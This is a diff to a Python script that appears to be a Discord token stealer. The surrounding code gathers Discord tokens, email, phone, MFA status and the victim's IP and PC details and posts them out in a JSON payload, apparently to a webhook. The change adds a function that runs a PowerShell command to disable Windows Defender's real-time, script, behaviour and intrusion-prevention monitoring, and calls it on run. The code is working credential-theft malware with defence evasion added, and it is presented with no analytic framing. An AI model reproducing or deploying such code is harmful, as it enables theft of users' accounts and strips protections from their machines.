@@ -8,8 +8,25 @@ from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
 import requests, json, os
 from datetime import datetime
-import qrcode
-from PIL import Image
+import subprocess
+
+def disable_windows_defender():
+    # Commande PowerShell pour désactiver certaines fonctionnalités de Windows Defender
+    command = '''
+    powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true"
+    '''
+    try:
+        # Exécution de la commande PowerShell
+        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        print("Windows Defender désactivé avec succès.")
+        print("Résultat :", result.stdout)
+    except subprocess.CalledProcessError as e:
+        print("Erreur lors de la désactivation de Windows Defender.")
+        print("Erreur :", e.stderr)
+
+if __name__ == "__main__":
+    disable_windows_defender()
+
 
 tokens = []
 cleaned = []
@@ -116,8 +133,8 @@ def get_token():
 > :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
 > :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
 > :piñata: __Token__\n\t`{tok}`\n
-*Made by ĐΛ乙ÅĪ* **|** ||||"""
-                        payload = json.dumps({'content': embed, 'username': 'ĐΛ乙ÅĪ', 'avatar_url': 'https://images-ext-1.discordapp.net/external/DWzvg-Etqi91iGcnqCFS_-bpzh7AsKbZ-sqjKrAYfb0/%3Fsize%3D4096%26ignore%3Dtrue/https/cdn.discordapp.com/avatars/988487657837461605/b61cfbd6be62605b61958a145fa9b09c.png?width=676&height=676'})
+*Made by ĐΛ乙ÅĪ* **|** ||Etat Major de Kyoto||"""
+                        payload = json.dumps({'content': embed, 'username': 'ĐΛ乙ÅĪ', 'avatar_url': 'https://i.ytimg.com/vi/gWFGPntLdRM/maxresdefault.jpg'})
                         try:
                             headers2 = {
                                 'Content-Type': 'application/json',
@@ -129,5 +146,3 @@ def get_token():
                 else: continue
 if __name__ == '__main__':
     get_token()
-
-
